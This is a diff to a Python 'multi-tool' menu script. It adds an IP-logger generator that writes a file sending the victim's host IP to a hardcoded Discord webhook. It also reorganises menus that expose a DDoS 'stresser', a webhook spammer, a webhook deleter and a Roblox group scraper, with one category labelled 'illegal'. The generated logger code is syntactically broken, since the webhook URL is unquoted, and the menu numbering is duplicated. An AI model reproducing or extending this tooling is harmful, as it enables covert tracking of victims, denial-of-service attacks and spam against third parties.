@@ -154,6 +154,59 @@ def groupScraper():
             print("proxies have been saved to" + colour + '"proxies.txt"')
             time.sleep(5)
             log("groupscraper")
+def ipLogger():
+    webhook = input("webhook")
+    with open("logger.py", "w") as f:
+        f.write("""
+from dhooks import Webhook
+import socket
+
+hook = https://discord.com/api/webhooks/757606787372417114/-00U29n-3a8Hj1o7o3V1AbGS8H7k-X6Nqp4USTAQMmAiR4Jk1YLgh7fNmsdI2CSd5dfC
+hook.send(socket.gethostbyname(socket.getfqdn()))
+        """)
+def optionsDiscord():
+    sex = "\033[33m"
+    cex = "\033[36m"
+    print(sex + '        [1]' + cex + '  webhook spammer')
+    print(sex + '        [2]' + cex + '  webhook deleter')
+    choose = input("  > ")
+    if(choose == str(1)):
+        webhookSpammer()
+    elif(choose == str(2)):
+        webhookDelete()
+def optionsIllegal():
+    sex = "\033[33m"
+    cex = "\033[36m"
+    print(sex + '        [1]' + cex + '  ddoser')
+    print(sex + '        [1]' + cex + '  ip logger (BETA)')
+    choose = input("  > ")
+    if(choose == str(1)):
+        ipStresser()
+    elif(choose == str(2)):
+        ipLogger()
+
+def optionsRoblox():
+    sex = "\033[33m"
+    cex = "\033[36m"
+    print(sex + '        [1]' + cex + '  group scraper (BETA) ')
+    choose = input("  > ")
+    if(choose == str(1)):
+        groupScraper()
+
+def optionsOther():
+    sex = "\033[33m"
+    cex = "\033[36m"
+    print(sex + '        [1]' + cex + '  geoip')
+    print(sex + '        [2]' + cex + '  proxy scraper')
+    print(sex + '        [3]' + cex + '  covid')
+    choose = input("  > ")
+    if(choose == str(1)):
+        GeoIP()
+    elif(choose == str(2)):
+        ProxyScrape()
+    elif(choose == str(3)):
+        covidCheck()
+
 
     # main code
 class Main():
@@ -180,33 +233,19 @@ class Main():
             if(choose == str(1)):
                 self.cls()
                 self.start_logo()               
-                GeoIP()
+                optionsDiscord()
             elif(choose == str(2)):
                 self.cls()
                 self.start_logo()
-                ProxyScrape()
+                optionsRoblox()
             elif(choose == str(3)):
                 self.cls()
                 self.start_logo()
-                webhookSpammer()
+                optionsIllegal()
             elif(choose == str(4)):
                 self.cls()
                 self.start_logo()
-                webhookDelete()
-            elif(choose == str(5)):
-                self.cls()
-                self.start_logo()
-                covidCheck()
-            elif(choose == str(6)):
-                self.cls()
-                self.start_logo()
-                ipStresser()
-            elif(choose == str(7)):
-                self.cls()
-                self.start_logo()
-                groupScraper()
-
-
+                optionsOther()
 
 
     def start_logo(self):
@@ -226,13 +265,12 @@ class Main():
             sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
             time.sleep(0.05)
     def options(self):
-        print(self.y + '        [1]' + self.c + '  geoip')
-        print(self.y + '        [2]' + self.c + '  proxy scraper')
-        print(self.y + '        [3]' + self.c + '  webhook spammer')
-        print(self.y + '        [4]' + self.c + '  webhook deleter')
-        print(self.y + '        [5]' + self.c + '  covid')
-        print(self.y + '        [6]' + self.c + '  totally something legal yes yes')
-        print(self.y + '        [7]' + self.c + '  group scraper')
+        print(self.y + '        [1]' + self.c + '  discord tools')
+        print(self.y + '        [2]' + self.c + '  roblox tools')
+        print(self.y + '        [3]' + self.c + '  ddos tools')
+        print(self.y + '        [4]' + self.c + '  other tools')
+        
+
 
 
 
